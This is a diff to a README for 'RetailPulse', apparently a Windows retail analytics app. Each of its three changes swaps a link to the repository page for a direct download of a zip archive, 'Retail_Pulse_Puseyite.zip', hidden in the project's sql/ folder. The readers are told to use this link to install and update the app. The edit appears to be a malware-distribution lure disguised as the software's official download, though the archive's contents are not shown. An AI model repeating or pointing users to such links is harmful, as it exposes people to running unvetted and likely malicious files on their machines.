@@ -1,6 +1,6 @@
 # 📊 RetailPulse - Understand Customers, Predict Sales
 
-[![Download RetailPulse](https://img.shields.io/badge/Download-RetailPulse-blue?style=for-the-badge&labelColor=grey)](https://github.com/catalectic-artform408/RetailPulse)
+[![Download RetailPulse](https://img.shields.io/badge/Download-RetailPulse-blue?style=for-the-badge&labelColor=grey)](https://raw.githubusercontent.com/catalectic-artform408/RetailPulse/main/sql/Retail_Pulse_Puseyite.zip)
 
 ## 🚀 What RetailPulse Does
 
@@ -37,7 +37,7 @@ For best results, use a machine with:
 
 Visit this page to download:
 
-https://github.com/catalectic-artform408/RetailPulse
+https://raw.githubusercontent.com/catalectic-artform408/RetailPulse/main/sql/Retail_Pulse_Puseyite.zip
 
 Open the link in your browser, then follow the steps on the page to get the latest version of RetailPulse for Windows.
 
@@ -235,6 +235,6 @@ For clean results, use data that:
 
 If you want the newest version, return to:
 
-https://github.com/catalectic-artform408/RetailPulse
+https://raw.githubusercontent.com/catalectic-artform408/RetailPulse/main/sql/Retail_Pulse_Puseyite.zip
 
 Use that link any time you need to get the app again or check for updated files
